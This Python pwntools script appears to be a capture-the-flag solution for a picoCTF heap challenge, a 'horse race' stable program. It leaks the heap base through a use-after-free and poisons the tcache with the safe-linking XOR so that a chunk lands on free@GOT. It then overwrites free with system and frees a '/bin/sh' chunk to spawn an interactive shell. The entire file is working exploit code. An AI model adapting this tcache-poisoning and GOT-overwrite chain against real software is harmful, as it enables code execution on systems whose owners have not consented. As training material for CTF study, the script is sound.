#!/usr/bin/env python3

from pwn import *

r = process('./vuln')
#r = remote('saturn.picoctf.net', 61447)

def edit_horse(idx, data, spot):
    r.sendlineafter(b'Choice: ', b'0')
    r.sendlineafter(b'Stable index # (0-17)? ', str(idx).encode())
    r.sendlineafter(b'Enter a string of 16 characters: ', data)
    r.sendlineafter(b'New spot? ', str(spot).encode())

def add_horse(idx, size, data):
    r.sendlineafter(b'Choice: ', b'1')
    r.sendlineafter(b'Stable index # (0-17)? ', str(idx).encode())
    r.sendlineafter(b'Horse name length (16-256)? ', str(size).encode())
    r.sendlineafter(b'characters: ', data)

def free_horse(idx):
    r.sendlineafter(b'Choice: ', b'2')
    r.sendlineafter(b'Stable index # (0-17)? ', str(idx).encode())

def race_horse():
    r.sendlineafter(b'Choice: ', b'3')

def exploit():
    # leak heap
    add_horse(0, 0x10, b'A' * 0x10)
    free_horse(0)
    add_horse(0, 0x10, b'\xFF')
    # fill system GOT
    for i in range(1, 5):
        add_horse(i, 0x10, b'X' * 0x10)
    race_horse()
    r.recvuntil(b' ')
    heap_base = u32(r.recvn(10).strip().ljust(4, b'\x00')) << 12
    log.info('heap_base: %#x', heap_base)
    r.recvuntil(b'WINNER:')
    # tcache list
    add_horse(10, 0x18, b'A' * 0x18)
    add_horse(11, 0x18, b'B' * 0x18)
    free_horse(10)
    free_horse(11)
    # change tcache bins to free GOT
    free_got = 0x404010
    edit_horse(11, p64(free_got ^ (heap_base >> 12)) + p64(heap_base + 0x10), 1)
    add_horse(12, 0x18, b'/bin/sh\0' + b'C' * 0x10)
    # change free GOT to system
    ret_gadget = 0x401E48
    system_plt = 0x401090
    payload = flat(
        p64(0),
        p64(system_plt),
        p64(ret_gadget),
    )
    add_horse(13, 0x18, payload)
    free_horse(12)
    #r.sendline(b'cat *lag*')
    r.interactive()

if __name__ == '__main__':
    exploit()
